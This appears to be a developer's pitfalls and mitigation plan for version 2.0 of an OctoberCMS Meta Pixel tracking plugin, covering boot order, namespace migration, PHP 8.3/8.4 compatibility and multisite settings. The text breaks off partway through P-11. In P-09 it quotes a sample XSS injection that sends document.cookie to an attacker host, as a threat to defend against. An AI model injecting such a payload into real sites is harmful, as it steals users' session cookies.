# v2.0 Pitfalls — Generic-Event-Tracking Marketplace Plugin

**Project:** Logingrupa.Metapixel v2.0.0 (pivot from v1.1.1 Shopaholic-coupled)
**Researched:** 2026-05-15
**Scope:** Mistakes specific to adding marketplace + adapter pattern + multi-PHP-version + namespace-rename to v1.x base. Generic OctoberCMS pitfalls excluded.
**Anchor:** Every pitfall cites a v1.x mistake (REVIEW finding, production incident, or design SUPERSEDED in archive) as concrete evidence the pitfall is live.

---

## Pitfall Index (severity-ordered)

| # | Pitfall | Severity | Phase to address |
|---|---------|----------|------------------|
| P-01 | Cross-context resolution drift (AdapterRegistry / SiteResolver / Settings reads diverge between writer + reader contexts) | CRITICAL | Phase 2 (adapter contract) + Phase 4 (Multisite Settings) |
| P-02 | AdapterRegistry registered too late / boot-order race (PluginGuard primes before adapters registered) | CRITICAL | Phase 2 (boot sequence lock) |
| P-03 | `composer require lovata/shopaholic-plugin` hidden under "suggest" — but code still hard-references `Lovata\OrdersShopaholic\Models\Order` | CRITICAL | Phase 1 (composer.json) + Phase 3 (ShopaholicAdapter isolation) |
| P-04 | Namespace rename leaves orphan DB tables / cache keys / Settings rows on legacy installs | CRITICAL | Phase 1 (rename) + Phase 9 (BC layer) |
| P-05 | EventLog UNIQUE index becomes ambiguous when `subject_type` string changes (`Lovata\...\Order` vs `Logingrupa\Metapixel\Subjects\OrderProxy`) | CRITICAL | Phase 3 (adapter port) + migration audit |
| P-06 | PHP 8.4-only syntax silently slips in (`property hooks`, `array_find`, `#[\Deprecated]`, asymmetric visibility) — fatal on 8.3 install | HIGH | Phase 1 (CI matrix) + every phase (lint) |
| P-07 | `php-domain-parser ^6` IDNA2008 stricter resolution rejects valid operator hosts (e.g. punycode IDN, single-label hosts) | HIGH | Phase 4 (Settings rewrite) |
| P-08 | `Event::fire(...)` decision-point hooks expose mutable payloads; third-party listener silently corrupts shared array | HIGH | Phase 2 (hook contract) |
| P-09 | ThemeActionAdapter Larajax endpoint becomes open relay for arbitrary `event_name` (CR-05 XSS re-resurrected at scale) | HIGH | Phase 5 (ThemeAction) |
| P-10 | Multisite trait on `pixel_id` propagates default value, masking per-site overrides; or `$propagatable` misuse leaks tokens cross-site | HIGH | Phase 4 (Settings) |
| P-11 | Optional-Composer-suggest pattern: `class_exists()` check at module-load time when autoloader hasn't loaded the suggested plugin yet | HIGH | Phase 1 (boot) + Phase 3 (discovery) |
| P-12 | MetapixelTestCase still boots Shopaholic Orders table — generic-core tests fail on minimal install (no Shopaholic) | HIGH | Phase 1 (test infra split) |
| P-13 | `addDynamicMethod()` + `Component::extend()` extensibility surface unbounded — third parties register conflicting methods | MEDIUM | Phase 2 (registry contract) |
| P-14 | Settings rename without migration: v1.x `paid_status_code`, `refire_purchase_on_status_flip` are Shopaholic-specific keys; v2.0 generic shape can't read them | MEDIUM | Phase 9 (BC migration) |
| P-15 | `EnsureFbpFbcCookies` `HOST_INDEX_MAP` hardcoded for nailscosmetics.* — marketplace install on operator domain → empty subdomain index → `_fbp` rejected by Meta | MEDIUM | Phase 4 (Settings) |
| P-16 | Plugin manifest `Plugin.php::pluginDetails()` identifier changes — October CMS treats as NEW plugin → re-migrates from scratch on legacy install | MEDIUM | Phase 9 (BC) |
| P-17 | Backward-compat shim package `Logingrupa\Metapixelshopaholic` proxies to `Logingrupa\Metapixel` creating subtle dual-load on systems with both plugins enabled | MEDIUM | Phase 9 (BC) |
| P-18 | `php-domain-parser` PSL cache write-fails silently on read-only Forge release dirs → every request re-fetches PSL → rate-limit / slow start | MEDIUM | Phase 4 |
| P-19 | Pest 4 `uses(...)->in('Feature')` boot wiring carries over Shopaholic-coupled `MetapixelTestCase` to adapter-specific tests | LOW | Phase 1 |
| P-20 | `composer qa` green on dev box (Shopaholic installed) but red on marketplace fresh install (Shopaholic absent) — coverage 90% threshold computed against partial code paths | LOW | Phase 1 (dual-CI) |

---

## CRITICAL

### P-01 — Cross-context resolution drift (writer vs reader)

**v1.x anchor:** Phase 3.1-07 production bug, orders 29802+29803 on `your-staging-host.example` (2026-05-14). Writer (admin `/back` queue) saw `SiteManager::getActiveSiteId() = null`; reader (frontend `/lv/checkout`) saw `= 1`; UNIQUE constraint on `(subject_type, subject_id, event_name, channel, site_id)` made the rows un-pair. CAPI fired 2xx, Pixel never rendered, attribution silent.

**What goes wrong in v2.0:** The same class of bug multiplies because v2.0 adds MORE context-dependent reads:

1. **AdapterRegistry::resolve($obSubject)** — must return the SAME adapter in admin queue AND frontend render. If registration is request-scoped (e.g. registered inside a Service Provider that only boots on frontend), admin writes use wrong adapter or no adapter at all.
2. **Settings reads with Multisite trait** — `Settings::get('pixel_id')` returns the per-site override on frontend, base value on admin queue. Two channels POST to different pixel_ids for the same Order. Meta dedup fails silently.
3. **`SiteResolver::forOrder` generalizes to `EventSubjectAdapter::getSiteId($obSubject)`** — every adapter MUST reuse the Phase 3.1-07 contract (read from the subject, never from active context). One adapter implementer forgetting → bug returns.

**Warning signs during build:**
- Any test that uses `Site::setSite($i)` / `Config::set('system.active_site', ...)` to set up a scenario — if removing the setup still makes the test pass, the production code is reading active context (smell).
- `SiteManager::instance()` appears in `classes/`, `components/`, or `models/` outside `SiteResolver` itself.
- `Request::*`, `app('request')`, or `request()` calls in `classes/queue/*` (queue context has no Request).
- Adapter's `getSiteId()` implementation reads anything other than `$obSubject` attributes.

**Prevention strategy:**
1. **Lint rule (PHPStan disallowed-calls):** ban `SiteManager::instance()::getActiveSiteId()`, `request()`, `Request::*` in `classes/queue/`, `classes/event/`, `classes/adapter/`. Allowlist `classes/helper/SiteResolver.php` only.
2. **Contract test in `AdapterRegistryTest`:** for every registered adapter, assert `$obAdapter->getSiteId($obSubject)` is deterministic given fixture subject regardless of `Site::setSite(null)` vs `Site::setSite(1)`.
3. **Code-review checklist item:** "Does this PR add a context-dependent read (Request, SiteManager active, Auth user, config('app.url'))? If yes, is it gated behind an adapter method that accepts the subject?"
4. **Convention doc (CLAUDE.md addendum):** "Authoritative source for ANY per-event attribute = the subject's adapter, never request context. Queue jobs serialize subject ID; they re-resolve via adapter at handle time."

**Phase mapping:**
- **Phase 2 (Adapter contract):** define `EventSubjectAdapter::getSiteId(): ?int` as REQUIRED method, document the contract in the interface docblock, add the contract test.
- **Phase 4 (Multisite Settings):** when Multisite trait is added to `pixel_id` + `capi_access_token`, audit every read site — admin queue reads MUST resolve site_id from Order/subject BEFORE reading Settings, not from active context.

---

### P-02 — Boot-order race: PluginGuard primes before adapters registered

**v1.x anchor:** Phase 2 SKEL-05 (`Plugin::boot()` calls `PluginGuard::instance()` which calls `Settings::get('pixel_id')` — fine for v1.x because Settings was the only source). REVIEW CR-04 also documents that container singleton + reflection-primed test state created stale-closure bugs (`App::forgetInstance` doesn't clear bindings).

**What goes wrong in v2.0:** AdapterRegistry::register() will be called from THIRD-PARTY plugin `Plugin::boot()` methods. OctoberCMS plugin boot order is NOT guaranteed deterministic — depends on dependency declarations + filesystem ordering. Possible failure modes:

1. `Logingrupa\Metapixel\Plugin::boot()` runs BEFORE `Logingrupa\MetapixelShopaholicAdapter\Plugin::boot()` registers `ShopaholicAdapter`. If `PluginGuard` or `OrderStatusWatcher` event subscriber tries to resolve an adapter at boot time, it gets empty registry.
2. Reverse order: third-party adapter `Plugin::boot()` runs before metapixel core, calls `AdapterRegistry::register(...)` but registry singleton isn't initialized → fatal "class not found" or silent no-op.
3. v1.x `Plugin::boot()` calls `Event::subscribe(OrderStatusWatcher::class)` — this is fine because watcher subscribes events but doesn't FIRE. v2.0 if any `Plugin::boot()` calls a registry-using helper synchronously, it locks in pre-registration state.

**Warning signs:**
- `AdapterRegistry::resolve(...)` called synchronously from any `Plugin::boot()` method.
- `PluginGuard::instance()` resolves adapter list at boot.
- Tests pass when run individually but fail when run as a suite (boot order matters).
- Third-party adapter authors complain "my adapter isn't registered" (silent registry miss).

**Prevention strategy:**
1. **Two-phase boot pattern:**
   - Phase A (boot): every plugin calls `AdapterRegistry::register($sName, $sClass)` — STORES class names only, no resolution.
   - Phase B (lazy, first resolve): `AdapterRegistry::resolve()` instantiates from class name on first call AFTER all plugins booted.
2. **Defer subscribers:** `OrderStatusWatcher` and any event-subject-handler subscribes the event via `Event::listen` (deferred lookup), not via `Event::subscribe(Watcher::class)` (which resolves the watcher immediately).
3. **Boot-time invariant test:** integration test boots a synthetic 3-plugin install (metapixel core + ShopaholicAdapter + ThemeActionAdapter) in both registration orders; asserts `AdapterRegistry::all()` count is the same after boot completes.
4. **Registry contract:** `register()` is idempotent + order-agnostic + late-binding. Document this in the interface PHPDoc.
5. **Test for closure-binding bug class (CR-04 anchor):** `AdapterRegistry::flush()` test asserts `App::offsetUnset('metapixel.adapters')` clears both BINDING and INSTANCE; resolution after flush returns fresh state.

**Phase mapping:**
- **Phase 2:** lock boot sequence (`AdapterRegistry` contract, deferred resolution). Write boot-order invariant test.
- **Phase 3 (ShopaholicAdapter port):** port `OrderStatusWatcher` to subscribe via `Event::listen('eloquent.saved: Lovata\OrdersShopaholic\Models\Order', ...)` not `Event::subscribe(Watcher::class)`.

---

### P-03 — `lovata/shopaholic-plugin` in `suggest:` but code still hard-types `Lovata\OrdersShopaholic\Models\Order`

**v1.x anchor:** `composer.json` `require: lovata/ordersshopaholic-plugin ^1.33`. v1.x PayloadBuilder, UserDataHasher, OrderStatusWatcher, SiteResolver::forOrder, PurchasePixel, SendCapiEvent all `use Lovata\OrdersShopaholic\Models\Order` and type-hint Order in signatures. PROJECT.md pivot rationale explicitly lists these 7 coupling points.

**What goes wrong in v2.0:** Moving `lovata/shopaholic-plugin` from `require:` to `suggest:` is a one-line composer.json change, but it is NOT the actual decoupling. If ANY v2.0 code path still imports `Lovata\OrdersShopaholic\Models\Order` (even inside an adapter), then:

1. On a marketplace install WITHOUT Shopaholic: Composer autoload returns class-not-found. October plugin loader fatals on `Plugin::boot()`. Operator's whole site dies.
2. Composer warns at install time "lovata/shopaholic-plugin: suggested" but operator says "I'll add it later" and the plugin is non-functional with cryptic error.
3. PHPStan analyse passes locally because Shopaholic IS installed in dev — false-green CI.

**Warning signs:**
- `grep -rE 'use Lovata\\\\(Orders)?Shopaholic' classes/ components/ models/` returns ANY hit outside `classes/adapter/ShopaholicAdapter/`.
- Type hints `Order $obOrder` outside ShopaholicAdapter namespace.
- `Lovata\OrdersShopaholic\Models\*::class` string references outside ShopaholicAdapter.
- Generic-core test fails when run without Shopaholic loaded.

**Prevention strategy:**
1. **CI matrix:** TWO test runs.
   - Run A: full Lovata stack installed → all tests + ShopaholicAdapter tests.
   - Run B: minimal OctoberCMS, NO Lovata plugins → generic core tests only. If ANY class outside `adapter/ShopaholicAdapter/` fails to load, Run B fails red.
2. **PHPStan rule:** `disallowed-class` config forbids `Lovata\OrdersShopaholic\*` in directories outside `classes/adapter/ShopaholicAdapter/`. Same for `Lovata\Shopaholic\*`, `Lovata\Buddies\*`.
3. **Composer-dependency-analyser** (`shipmonk/composer-dependency-analyser`): asserts only `lovata/*` packages used are limited to the adapter directory.
4. **Adapter contract layer:** generic core never imports Lovata classes; only depends on `EventSubjectAdapter` interface. `ShopaholicAdapter::class` is the only bridge.
5. **Static check in `bin/`:** pre-commit script `! grep -rE 'use Lovata' classes/ models/ components/ middleware/ | grep -v 'classes/adapter/'` exits non-zero.

**Phase mapping:**
- **Phase 1 (composer.json + CI):** add Run B (minimal install) to GitHub Actions matrix. Composer-dependency-analyser config.
- **Phase 3 (ShopaholicAdapter port):** every Lovata import inside `classes/adapter/ShopaholicAdapter/` namespace only. Run B must pass green after Phase 3 close.

---

### P-04 — Namespace rename leaves orphan tables, cache keys, Settings rows on legacy installs

**v1.x anchor:** Plugin identifier `Logingrupa.Metapixelshopaholic` baked into:
- DB table `logingrupa_metapixel_event_log` (table name is OK — already generic)
- October's `system_plugin_versions.code = 'Logingrupa.Metapixelshopaholic'` ledger
- `system_settings.item = 'logingrupa_metapixelshopaholic_settings'`
- CCache tags + cache keys
- Lang namespace `logingrupa.metapixelshopaholic::lang.*` (200+ keys across en/lv/ru)
- ExceptionHierarchyTest already failed on this in v1.x (Phase 3.1-08 T3.2 — translation key unresolved)

**What goes wrong in v2.0:** Operator upgrading nailscosmetics.* from `legacy/v1.1.1` branch to v2.0:

1. New plugin code dir `plugins/logingrupa/metapixel/` doesn't auto-detect the old `plugins/logingrupa/metapixelshopaholic/` install. Both dirs co-exist on disk if operator doesn't remove the old one → double-booted plugin, duplicate event subscribers, duplicate Settings forms.
2. `php artisan october:up` runs migrations for the new plugin code — but the old plugin code's `system_plugin_versions` row stays at `Logingrupa.Metapixelshopaholic` with last_version='1.1.1' UNRELATED to the new plugin's ledger row at `Logingrupa.Metapixel` starting from '0.0.0'.
3. Lang key `logingrupa.metapixelshopaholic::lang.exception.missing_pixel_config` is referenced by exception classes that were copy-renamed to `Logingrupa\Metapixel\Exception\*` — exception thrown, log message is the raw unresolved key.
4. Operator's pre-existing `system_settings` row keyed `logingrupa_metapixelshopaholic_settings` carries 10 fields of live config. New plugin reads from `logingrupa_metapixel_settings` (empty) → plugin disabled at boot → all tracking stops, silently.

**Warning signs:**
- After v2.0 upgrade on a legacy install: `Settings::isDisabled()` returns true despite operator having configured pixel_id pre-upgrade.
- Backend Settings page renders fields but values are empty (operator says "I just configured this!").
- Log lines contain raw lang keys (`logingrupa.metapixelshopaholic::lang.*`).
- `system_plugin_versions` table has BOTH rows (old + new identifier).
- Duplicate event subscribers (Purchase event fires twice — both plugins handle it).

**Prevention strategy:**
1. **Phase 9 BC migration:** explicit `updates/2026_06_XX_migrate_v1_settings_to_v2.php`:
   ```php
   public function up(): void
   {
       // 1. Copy system_settings.value where item LIKE 'logingrupa_metapixelshopaholic_settings'
       //    to new item key 'logingrupa_metapixel_settings'. Idempotent.
       // 2. Mark legacy plugin disabled in system_plugin_versions if present.
       // 3. Rewrite logingrupa_metapixel_event_log.subject_type strings from
       //    'Lovata\OrdersShopaholic\Models\Order' to canonical adapter class name
       //    IF the namespace change touched it (audit P-05 first).
   }
   ```
2. **Plugin manifest pluginDetails() returns `replaces: 'Logingrupa.Metapixelshopaholic'`** (if OctoberCMS supports this — verify with Lovata.Toolbox conventions; otherwise document operator-manual uninstall step).
3. **README upgrade section:** "Upgrading from v1.x: (1) operator removes `plugins/logingrupa/metapixelshopaholic/` dir, (2) operator deploys v2.0, (3) `php artisan october:up` runs auto-migration."
4. **Smoke test:** integration test boots SQLite, seeds a v1.1.1-shape `system_settings` row, runs v2.0 migrations, asserts new Settings row reads correctly.
5. **Lang namespace rename:** keep old keys as fallback for one major release. `lang/en/lang.php` has BOTH namespaces routing to same string until v3.

**Phase mapping:**
- **Phase 1 (rename + composer.json):** namespace + dir rename. Capture pre-rename `system_settings` row shape as fixture.
- **Phase 9 (BC + legacy install upgrade):** migration + README upgrade guide + smoke test. Production blocker for nailscosmetics.* upgrade.

---

### P-05 — EventLog `subject_type` ambiguity after adapter pattern

**v1.x anchor:** Phase 3.1 introduced `subject_type` column carrying FQN of subject class (`Lovata\OrdersShopaholic\Models\Order`). UNIQUE index = `(subject_type, subject_id, event_name, channel, site_id)`.

**What goes wrong in v2.0:** Adapter pattern raises the question "what string goes in subject_type?":

- Option A: keep raw FQN of the underlying model (`Lovata\OrdersShopaholic\Models\Order`) → ShopaholicAdapter v2.0 writes rows that pair correctly with v1.1.1's pre-upgrade rows. But ThemeActionAdapter has no model — what string?
- Option B: write adapter class name (`Logingrupa\Metapixel\Adapters\Shopaholic\OrderAdapter`) → v1.1.1 rows on legacy installs become unreachable from v2.0 readers (UNIQUE constraint sees `subject_type` mismatch, race-fence re-fires Purchase → double-counting in Meta Ads Manager).
- Option C: write a string from an adapter-supplied alias (`shopaholic.order`) → cleanest. But requires migration P-04 to rewrite legacy rows.

Mixing options A and B across adapters → broken pairing within a single deploy.

**Warning signs:**
- Purchase event fires twice after v2.0 upgrade on a legacy install.
- `event_log` table has rows with `subject_type` strings that don't match any active adapter alias.
- ThemeActionAdapter writes rows with `subject_type = ''` or `null` (no model backing).
- Polymorphic `subject()` MorphTo relation breaks because the string isn't a resolvable class.

**Prevention strategy:**
1. **Decision lock in Phase 2:** `subject_type` is an adapter-supplied OPAQUE STRING ALIAS (Option C). Adapter exposes `getSubjectType(): string` returning e.g. `'shopaholic.order'`, `'theme.action'`, `'meloncart.order'`. Document the rule in interface PHPDoc: "Treat as primary key namespace, NOT a class FQN."
2. **EventLog model:** drop the polymorphic `subject()` MorphTo relation OR replace it with an adapter-routed resolver: `$obEventLog->getSubject() = AdapterRegistry::resolve($obEventLog->subject_type)::loadById($obEventLog->subject_id)`. (Cleaner; preserves SRP.)
3. **Migration P-04 addendum:** rewrite `subject_type` from FQN strings to aliases on upgrade.
4. **UNIQUE constraint test:** integration test writes two rows for the same Order via ShopaholicAdapter, asserts second INSERT fails on UNIQUE collision; then writes a ThemeAction row for the same numeric subject_id, asserts INSERT succeeds (different `subject_type` alias).

**Phase mapping:**
- **Phase 2 (adapter contract):** lock alias-string convention. Add `getSubjectType()` to interface.
- **Phase 3 (ShopaholicAdapter):** port v1.x rows via migration; adapter returns `'shopaholic.order'`.
- **Phase 5 (ThemeActionAdapter):** returns `'theme.action'`.

---

## HIGH

### P-06 — PHP 8.4-only syntax slips in

**v1.x anchor:** v1.1.1 ran on PHP 8.4 only (`"php": "^8.4"`). Phase 3 used `public readonly array $arContext` exception immutability — a PHP 8.1 feature, safe. But v1.x exception classes, queue jobs, and recent additions used **PHP 8.4-only** patterns enabled by 8.4 dev:
- Property hooks (`get`/`set` accessors) — 8.4 only
- Asymmetric visibility (`public(set)`) — 8.4 only
- `array_find`, `array_find_key`, `array_any`, `array_all` — 8.4 only
- `#[\Deprecated]` attribute — 8.4 only
- Lazy objects (`new ReflectionClass->newLazy*`) — 8.4 only

PROJECT.md v2.0 lock-in explicitly enumerates these as forbidden, confirming the trap is real.

Additionally PHP 8.4 deprecates **implicit nullable types** — `function foo(string $bar = null)` now warns. Many v1.x signatures rely on this implicit nullable. They're 8.3-compatible (no warning) and 8.4-compatible-with-warning (still works), so the trap is subtle — `$bar` must become `?string $bar = null` explicitly.

**Warning signs:**
- `composer test` on 8.3 fails with `Parse error: syntax error` (8.4 syntax).
- Deprecation warnings count climbs on 8.4 (implicit nullable).
- CI passes on 8.4 but fails on 8.3 with "Class \\X uses property hooks not available before PHP 8.4".
- Operator on a Forge box pinned to 8.3 reports plugin fatals at boot.

**Prevention strategy:**
1. **CI matrix:** `strategy.matrix.php: [8.3, 8.4]`. Both must pass green for PR merge.
2. **Rector rule:** `Rector\Php83\Rector\ClassConst\AddTypeToConstRector` ON; `Rector\Php84\*` rules OFF (so Rector doesn't UPGRADE code to 8.4 syntax).
3. **PHPStan `phpVersion: 80300`** (the LOWER bound) — analyses against 8.3 grammar so 8.4 features fail static analysis even when developer's local PHP is 8.4.
4. **Explicit nullable lint:** Pint rule `nullable_type_declaration_for_default_null_value` ON.
5. **Pre-commit hook:** `grep -rE 'public\(set\)|public\(get\)|array_find\(|array_any\(|array_all\(|#\[\\Deprecated' classes/ | grep -v _test.php` → block commit if any hits.

**Phase mapping:**
- **Phase 1 (tooling):** PHP 8.3+8.4 CI matrix, Rector + PHPStan config, lint rules.
- **Every phase:** PR cannot merge unless both PHP versions green.

---

### P-07 — `php-domain-parser ^6` rejects valid operator hosts

**v1.x anchor:** Phase 2 CR-02 hardcoded `HOST_INDEX_MAP` for nailscosmetics.{no,lv,lt}. PROJECT.md v2.0 spec generalizes to operator-supplied Settings + `jeremykendall/php-domain-parser ^6` for multi-TLD index derivation.

**What goes wrong in v2.0:** `php-domain-parser ^6` is stricter than v5 (per upstream UPGRADING.md):
1. Default uses IDNA2008 — IDNA2003-encoded punycode (still common in legacy DNS records) is rejected unless explicit `Domain::fromIDNA2003()`.
2. Single-label hosts (`localhost`, `dev`) throw instead of returning unresolved domain → middleware throws on dev box.
3. Private TLDs (`*.local`, internal CDN hosts) aren't in PSL by default → throws.
4. PSL cache must be primed via `Pdp\Rules::fromPath(...)` or fetched at runtime — first request after deploy is slow / fails on read-only filesystem.
5. `Rules::resolve()` returns `ResolvedDomain`, not the v5 `Domain`. Existing call sites that expect `$obDomain->getContent()` break — v6 removed it (use `value()`).

Operator hosts that will fail:
- `nailscosmetics.lv` — works fine.
- `tienda.example.com.mx` — IDNA2008 OK if cache primed.
- `münchen.de` (umlaut, real-world) — needs IDNA2008 with intl extension; throws if intl not loaded.
- `localhost` (operator local dev) — throws `UnableToResolveDomain`. Plugin disables itself silently.
- `staging-37.example.co.uk` — public suffix `co.uk` resolved correctly only if PSL cache fresh.

**Warning signs:**
- Local dev with `localhost`: middleware throws, every page 500s.
- Forge deploy: first 30 seconds of requests fail because PSL not cached yet.
- IDN domain operators (German, Latvian-character) report cookies not set.
- Plugin works fine in dev → breaks on production CDN host with private suffix.

**Prevention strategy:**
1. **Wrap `php-domain-parser` calls in `try { ... } catch (\Pdp\CannotProcessHost $e) { return null; }` — fall back to "trust operator's Settings allowlist". Tiger-Style boundary fail-safe.
2. **Ship PSL cache file with the plugin** (commit a copy of `public_suffix_list.dat` updated periodically) + provide `php artisan metapixel:refresh-psl` artisan command. Loaded via `Pdp\Rules::fromPath(__DIR__.'/resources/psl.dat')` — no network at runtime.
3. **Settings page UI:** operator allowlists hosts explicitly (carry-forward v1.x pattern). PDP is used to DERIVE the cookie subdomain index for allowlisted hosts, NOT to gate trust. Two-tier: allowlist (operator owns) → PDP (RFC-correctness layer).
4. **Test matrix:** unit tests for hostname inputs `localhost`, `nailscosmetics.lv`, `www.example.co.uk`, `münchen.de`, `staging.shop.example.com.au`, malformed `not-a-host` — assert behavior is documented + safe (returns null or known index).
5. **Document fallback chain** in PHPDoc: "If PDP fails OR returns unexpected shape, use `count(explode('.', $sHost)) - 1` capped at 2 as final fallback — Meta accepts wrong-but-numeric index with degraded EMQ, not zero EMQ."

**Phase mapping:**
- **Phase 4 (Settings rewrite + TrustedHosts):** wrap PDP, ship PSL cache, allowlist UI, fallback chain. Test matrix.

---

### P-08 — `Event::fire(...)` decision-point hook with mutable payload

**v1.x anchor:** v1.x used `Event::subscribe(Watcher::class)` (listen pattern, not fire). v2.0 introduces `Event::fire('metapixel.event.before_dispatch', [$obPayload])` for extensibility (Lovata pattern — `shopaholic.sorting.product.get.list`).

**What goes wrong in v2.0:** Lovata's pattern passes payload BY-REFERENCE typically — listener mutates it. Two failure modes:

1. **Silent corruption:** third-party listener appends to `$obPayload->custom_data` array but accidentally overwrites `event_id` → dedup contract broken (server + browser fire different IDs, Meta sees as separate events, attribution double-counts).
2. **Order-dependent state:** if hooks fire in subscription order, plugin A's mutation can be overwritten by plugin B's. No deterministic priority system → silently order-dependent behavior.
3. **Listener throws:** v1.x Tiger-Style says boundary catches; but `Event::fire(...)` propagates exceptions to caller. If listener throws, the entire CAPI dispatch fails. Worse: queue job retries 3× executing the broken listener 3 more times.

**Warning signs:**
- After third-party plugin adds a listener, Meta Ads Manager shows DOUBLED conversions for some events.
- Queue dead-letter row count climbs after operator installs a community extension.
- `EventLog::custom_data` JSON has unexpected/extra keys that don't match adapter contract.
- Plugin works fine, third-party plugin works fine alone, together they explode.

**Prevention strategy:**
1. **Hook payload contract:** `Event::fire('metapixel.event.before_dispatch', [$obImmutableEnvelope, $obMutableExtra])`. The envelope (`event_id`, `event_time`, `event_name`, `subject_type`, `subject_id`) is a `readonly` DTO — listeners can READ but cannot mutate. The `$obMutableExtra` is the only mutable slot, scoped to custom_data and user_data extension.
2. **Listener error isolation:** wrap each `Event::fire(...)` in try/catch with logging — but rethrow OR log+continue? Decision: catch + log + continue. Rationale: third-party listener failure must NOT break plugin's core dispatch. Test: simulate throwing listener, assert main dispatch succeeds, dead-letter records the listener exception separately.
3. **Hook documentation:** every `Event::fire(...)` site has a PHPDoc block stating: hook name, payload shape, mutation policy, exception handling.
4. **Hook listener test:** in the AuthoringGuide docs, ship a sample listener + a test fixture that mutates non-allowed fields → assert mutation is REJECTED (cloned envelope, mutation discarded).
5. **No `Event::halt(...)` listeners:** document explicitly that v2.0 hooks are NOT cancelable. Listener cannot abort a Purchase dispatch by returning false. Use a separate `metapixel.event.before_validate` halt-able hook for that use case.

**Phase mapping:**
- **Phase 2 (extensibility contract):** define hook contract, write listener-error-isolation test, document in AuthoringGuide.

---

### P-09 — ThemeActionAdapter Larajax endpoint = open relay for arbitrary `event_name` (CR-05 redux)

**v1.x anchor:** REVIEW CR-05 flagged Twig partial XSS sink — `event_name` interpolated raw into `<script>` tag. v1.x hardcoded event_name='PageView'/'Purchase' so not exploitable. v2.0 ThemeActionAdapter lets ANY theme JS call `larajax.post('Metapixel::trackEvent', {event_name: 'Lead', custom_data: {...}})` → CR-05 becomes exploitable by design unless server-side validates.

**What goes wrong in v2.0:**
1. Client sends `event_name = "Purchase'); fetch('//attacker/' + document.cookie); fbq('track', 'X"` — server happily includes in next Twig render or in CAPI payload. CAPI Meta endpoint rejects (good), but the same string round-trips into `EventLog::event_name` column and is read back in admin FailedEvents UI.
2. Client sends arbitrary `value`, `currency`, `content_ids` → CAPI dispatches with attacker-controlled data → conversion-value inflation (small ad budget burned by attacker, or Meta optimization poisoned).
3. Open relay: anonymous user without `_fbp` triggers `fetch('/metapixel/track-event', {event_name: 'PageView'})` from a non-related site (CORS open by default for storefront API) → free CAPI traffic from attacker.

**Warning signs:**
- FailedEvents admin shows `event_name` strings with HTML/JS payloads.
- CAPI rate-limit hit by 5xx from Meta after operator install.
- Meta Ads Manager reports spike of Lead/Purchase events with $0 value.
- Theme console: `larajax.post` from non-storefront origin succeeds.

**Prevention strategy:**
1. **Server-side allowlist:** `EVENT_NAME_ALLOWLIST = ['PageView', 'ViewContent', 'AddToCart', 'InitiateCheckout', 'Lead', 'Purchase', 'Search', 'Subscribe', 'CompleteRegistration', 'Contact']` (Meta's standard 18 events). Reject anything outside allowlist with 422. Custom events require operator-explicit Settings allowlist entry (per-operator).
2. **Server-derived value:** `value`, `currency`, `content_ids` are NEVER read from client request for Purchase/AddToCart-class events. Adapter resolves them from server state (cart session, order). For PageView/Lead-class events, value/currency rejected entirely.
3. **CSRF token enforcement** on Larajax route: October's built-in `\System\Classes\AjaxCsrf` middleware ON. Test: cross-origin POST returns 419.
4. **Rate limit** per session: max 30 events / minute. Stored in CCache by `session_id + ip`.
5. **Twig partial:** all string interpolation through `|e('js')|raw` (CR-05 fix applied universally, not just to Phase 2 PageView).
6. **Fuzzing test:** Pest test with array of malicious inputs (XSS payloads, SQLi-shaped strings, oversize strings, control chars, BOM, mixed encoding) → assert response 422 + nothing written to EventLog.

**Phase mapping:**
- **Phase 5 (ThemeActionAdapter):** allowlist + CSRF + rate limit + fuzzing test. Twig partial JS-escape audit.

---

### P-10 — Multisite trait on `pixel_id` propagates default; `$propagatable` misuse leaks tokens

**v1.x anchor:** Phase 3.1-07 shipped multi-site site_id symmetry but the Settings model was NOT Multisite-trait-enabled. PROJECT.md v2.0 spec adds Multisite trait to `pixel_id` + `capi_access_token`.

**What goes wrong in v2.0:** October's Multisite trait has subtle behaviors:

1. **`$propagatable` default = empty** — saves DO NOT propagate by default. Operator sets per-site `pixel_id` for site_id=1, leaves site_id=2 empty → site_id=2's request reads default-row pixel_id which is whatever site_id=1 had FIRST (or empty). Confusing UX.
2. **`$propagatable = ['pixel_id']`** → setting pixel_id on site 1 PROPAGATES to all sites silently. Operator never wanted that. Now all sites POST to same pixel.
3. **`$propagatable = ['capi_access_token']`** → CAPI token leaks across sites. Multi-tenant: site A's token written by site A admin, site B's queue dispatches CAPI to site A's pixel using site A's token. GDPR / data-leak risk.
4. **Save semantics:** `Settings::set(...)` does NOT call `savePropagate()` → mixed save state across sites depending on which CMS controller wrote.

**Warning signs:**
- Operator complains "I set pixel_id for .lv site, why does .no site fire the same pixel?"
- Settings backend page shows pixel_id field populated but operator says they never entered it.
- Test: change pixel_id on site 1, immediately read on site 2 — value matches site 1's input (propagation leak).
- Two operator orgs share a multi-site install (multi-tenant); cross-org pixel/token access via session swap.

**Prevention strategy:**
1. **Decision lock:** `$propagatable = []` (empty). Every site keeps its own pixel_id, token, test_event_code. NO propagation. Documented in CLAUDE.md.
2. **Migration:** when adding Multisite trait, migrate existing single-row Settings to per-site rows via:
   ```sql
   INSERT INTO logingrupa_metapixel_settings (site_id, pixel_id, capi_access_token, ...)
   SELECT s.site_id, settings.pixel_id, settings.capi_access_token, ...
   FROM existing_settings, system_site_definitions s;
   ```
   Idempotent. Default: every site gets the pre-multisite Settings as its initial per-site config; operator can override per-site afterwards.
3. **Settings UI:** explicit per-site selector at top of form (October has this for Multisite models). PHPDoc/help text: "Each site has its own pixel_id. Set per site."
4. **Cross-context test:** integration test seeds site 1 pixel_id='AAA', site 2 pixel_id='BBB'; dispatches Purchase for Order with site_id=2; asserts CAPI POST went to pixel BBB with token BBB, not AAA.
5. **Lint:** `grep` for `$propagatable` in models — fail if non-empty array literal (force PR review).

**Phase mapping:**
- **Phase 4 (Multisite Settings):** add trait with `$propagatable = []`, migration, UI, cross-context test.

---

### P-11 — Composer suggest + `class_exists()` autoloader race

**v1.x anchor:** v1.x had hard `require:` so autoload always loaded Lovata. v2.0 spec moves to `suggest:` + auto-detection.

**What goes wrong in v2.0:** Auto-detection patterns:
- ❌ `class_exists('\Lovata\OrdersShopaholic\Models\Order')` at `Plugin::boot()` time — works IF Composer's PSR-4 autoload was registered by Laravel before October Plugin loader boots. October's load order: app/composer autoload → plugin manifest scan → `Plugin::boot()` cascade. So PSR-4 IS loaded by the time `boot()` runs. **However**: October's plugin loader walks `plugins/` dir alphabetically — `logingrupa/` < `lovata/`, so Lovata plugins may not have been booted yet but their classes ARE autoloadable. Safe.
